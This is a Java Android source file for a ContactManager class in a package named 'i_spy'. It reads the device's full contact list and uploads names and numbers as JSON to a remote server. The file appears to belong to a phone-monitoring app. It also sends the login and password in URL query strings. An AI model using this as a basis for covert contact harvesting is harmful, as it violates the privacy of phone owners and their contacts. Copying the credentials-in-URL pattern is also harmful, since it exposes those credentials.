package com.um.asn.i_spy.managers;


import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.provider.ContactsContract;
import android.telephony.PhoneNumberUtils;

import com.um.asn.i_spy.Config;
import com.um.asn.i_spy.database_helper.DatabaseHelper;
import com.um.asn.i_spy.http_methods.HttpPostTask;
import com.um.asn.i_spy.http_methods.HttpPutTask;
import com.um.asn.i_spy.models.Contact;
import com.um.asn.i_spy.models.Phone;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Locale;
import java.util.concurrent.ExecutionException;

public class ContactManager {

    public Context context;
    public ConnectivityManager cm;
    public Phone phone;
    public ArrayList<Contact> contacts;

    public ContactManager(Context context, Phone phone) {
        this.context = context;
        this.phone = phone;
        this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        this.contacts = new ArrayList<Contact>();
    }

    public void run() {
        if (setContacts())
            insertUpdate();
    }

    public boolean setContacts() {
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Contact contact = new Contact();

                    contact.setIdRef(cur.getInt(cur.getColumnIndex(ContactsContract.Contacts._ID)));
                    contact.setNom(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));

                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))},
                            null
                    );

                    while (pCur.moveToNext()) {
                        if (!pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).equals("")) {
                            String num = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            String numE164 = "";
                            String numFormat = "";

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                numFormat = PhoneNumberUtils.formatNumberToE164(num, Locale.getDefault().getCountry());
                                if (numFormat == null)
                                    numFormat = PhoneNumberUtils.formatNumber(num, Locale.getDefault().getCountry());
                            } else {
                                numFormat = PhoneNumberUtils.formatNumber(num);
                            }

                            contact.setNumero(numFormat);
                            break;
                        }
                    }

                    pCur.close();
                    contact.setPhone(this.phone);

                    this.contacts.add(contact);
                }
            }
        }
        return this.contacts.size() > 0;
    }

    public void insertUpdate() {
        DatabaseHelper myBD = new DatabaseHelper(this.context);

        ArrayList<Contact> contactToUpdate = new ArrayList<Contact>();
        ArrayList<Contact> contactToInsert = new ArrayList<Contact>();
        for (Contact contact : this.contacts) {
            Contact contactBD = myBD.getByIdRefContact(contact.getIdRef());
            if (contactBD != null) {
                try {
                    if (!contact.isSame(contactBD)) {
                        contactToUpdate.add(contact);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                contactToInsert.add(contact);
            }
        }

        System.out.println("Nombre de contacts : " + this.contacts.size());
        System.out.println("Nombre de nouveaux contacts : " + contactToInsert.size());
        System.out.println("Nombre de contacts à mettre à jour : " + contactToUpdate.size());

        NetworkInfo networkInfo = this.cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {

            JSONArray jaI = new JSONArray();
            for (Contact c : contactToInsert) {
                JSONObject joI = new JSONObject();
                try {
                    joI.put("nom", c.getNom());
                    joI.put("numero", c.getNumero());
                    joI.put("idRef", c.getIdRef());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaI.put(joI);
            }

            JSONArray jaU = new JSONArray();
            for (Contact c : contactToUpdate) {
                JSONObject joU = new JSONObject();
                try {
                    joU.put("nom", c.getNom());
                    joU.put("numero", c.getNumero());
                    joU.put("idRef", c.getIdRef());
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jaU.put(joU);
            }

            try {
                String urlI = Config.SERVER_DOMAIN + "contacts";
                urlI += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject resultI = new JSONObject((String) new HttpPostTask().execute(new Object[]{urlI, jaI.toString()}).get());

                if ((boolean) resultI.get("success")) {
                    System.out.println("Contact saved dist");
                    for (Contact c : contactToInsert) {
                        myBD.insertContact(c);
                    }
                }

                String urlU = Config.SERVER_DOMAIN + "phone/" + phone.getId() + "/contacts";
                urlU += "?phone[login]=" + phone.getLogin() + "&phone[password]=" + phone.getPassword();
                JSONObject resultU = new JSONObject((String) new HttpPutTask().execute(new Object[]{urlU, jaU.toString()}).get());

                if ((boolean) resultU.get("success")) {
                    System.out.println("Contact update dist");
                    for (Contact c : contactToUpdate) {
                        myBD.updateByIdRefContact(c.getIdRef(), c);
                    }
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (ExecutionException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

}
